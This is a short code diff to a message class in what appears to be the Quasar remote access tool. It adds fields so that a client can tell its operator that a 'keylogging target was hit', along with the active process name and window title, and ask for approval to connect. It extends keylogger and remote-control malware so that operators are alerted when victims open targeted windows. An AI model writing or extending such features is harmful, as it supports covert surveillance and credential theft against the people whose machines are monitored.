@@ -11,6 +11,19 @@ namespace Quasar.Common.Messages
     {
         [ProtoMember(1)]
         public string Uuid { get; set; } = "";
+
+        // When true, the client is requesting operator approval to connect now
+        // because a keylogging target was hit.
+        [ProtoMember(2)]
+        public bool TargetHit { get; set; } = false;
+
+        // Optional context to show in the operator prompt when TargetHit is true.
+        [ProtoMember(3)]
+        public string ActiveProcessName { get; set; } = "";
+
+        // Optional context to show in the operator prompt when TargetHit is true.
+        [ProtoMember(4)]
+        public string ActiveWindowTitle { get; set; } = "";
     }
 }
 
